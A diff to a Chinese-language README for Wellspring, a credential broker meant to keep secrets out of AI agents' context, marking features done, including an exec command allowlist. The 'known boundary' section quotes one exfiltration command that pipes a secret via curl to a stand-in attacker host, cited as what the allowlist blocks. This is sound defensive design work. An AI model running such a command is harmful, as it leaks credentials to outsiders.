@@ -10,6 +10,7 @@
 | [research-runtime-isolation-report.md](./research-runtime-isolation-report.md) | 分报告 A：运行时隔离 / 沙箱 / 出口代理 / 凭证注入实现细节 |
 | [research-credential-broker-report.md](./research-credential-broker-report.md) | 分报告 B：密钥管理与凭证网关产品（Vault、Infisical、Keycard、NHI 厂商、云厂商） |
 | [research-mcp-report.md](./research-mcp-report.md) | 分报告 C：MCP 生态的凭证处理（网关、secrets server、三种姿势对比、CVE） |
+| [research-grok-bot-vault.md](./research-grok-bot-vault.md) | 分报告 D：Grok Bot Vault 产品拆解，以及对 Wellspring 的取舍参考 |
 | [design/CREDENTIAL-WATERWORKS-DESIGN.md](./design/CREDENTIAL-WATERWORKS-DESIGN.md) | **自研设计**：Wellspring 分发式凭证工具（三对象模型、15 种交付通道、PII 三档、命名与图标） |
 | [wellspring/](./wellspring) | **实现**：Bun/TS 单二进制，MCP + CLI + Web 管理台，含端到端测试 |
 
@@ -44,18 +45,21 @@
 | 存储：AES-256-GCM，描述符（指纹 + 脱敏）永不反解 | ✅ |
 | 交付通道 A1 env / A2 fd / C1 文件 / C1 模板 / askpass | ✅ |
 | **派生运算 derive**：TOTP / HMAC 签名 / AES-256-GCM 加解密，只回结果不回密钥 | ✅ |
-| MCP server（wellspring_list / describe / exec / derive），38 项端到端测试 | ✅ |
-| Web 管理台：凭据库 / 审计流水 / 用量统计 / 访问策略 | ✅ |
+| MCP server（list / describe / exec / derive / request / request_status 共 6 个工具），69 项端到端测试 | ✅ |
+| Web 管理台：凭据库 / 审计流水 / 用量统计 / 访问策略 / 待填写请求 | ✅ |
+| 任务中补充凭据：Agent 只发请求，人在独立页面录入，回传引用继续执行 | ✅ |
+| 每字段使用范围（调用者 / 通道 / 用途 / 目标，取水前校验） | ✅ |
+| 独立调用身份（scoped token），调用者由宿主令牌决定而非 agent 参数 | ✅ |
 | 短期凭证（TTL，到期即拒绝出水） | ✅ |
 | 一次性能力 token（60s，用后即焚，不可越权签发） | ✅ |
 | PII 三档 view / resolve / deliver + reason 白名单 + 限速 | ✅ |
 | 主密钥托管（seal + 系统钥匙串，防同 UID 进程直接读密钥文件） | ✅ |
-| exec 目标命令白名单（关掉「用凭证跑任意命令」这条越权路径） | 🚧 |
+| exec 目标命令白名单（关掉「用凭证跑任意命令」这条越权路径） | ✅ |
 | A3 短命动态凭证（对接上游签发，而非本地倒计时到期） | 📋 |
 
-**已知边界**：目标是「不让明文流经 agent 上下文」，不是「目标程序读不到」。被注入明文的目标程序若本身可被 agent 改写，则仍可能自行读出——这是分发式方案固有的边界，设计的缓解手段有三条，已实现两条：
+**已知边界**：目标是「不让明文流经 agent 上下文」，不是「目标程序读不到」。被注入明文的目标程序若本身可被 agent 改写，则仍可能自行读出——这是分发式方案固有的边界，设计的缓解手段有三条，均已实现：
 
-1. **目标命令白名单**（🚧 进行中）：策略只允许 `node *`、`psql **` 这类固定命令+参数模式，`wellspring exec --secret PW=... -- sh -c 'curl attacker/?p=$PW'` 这类一次性外泄原语直接被拒，且发生在取水之前；
+1. **目标命令白名单**：策略只允许 `node *`、`psql **` 这类固定命令+参数模式，`wellspring exec --secret PW=... -- sh -c 'curl attacker/?p=$PW'` 这类一次性外泄原语直接被拒，且发生在取水之前；
 2. **短期凭证**：`--ttl 1h` 的凭证到期即不出水，即使被外泄也已失效；
 3. **全程审计**：每次取水与派生都记一条 JSONL 事件（谁-哪个字段-哪条通道-结果），可回溯、可撤销。
 
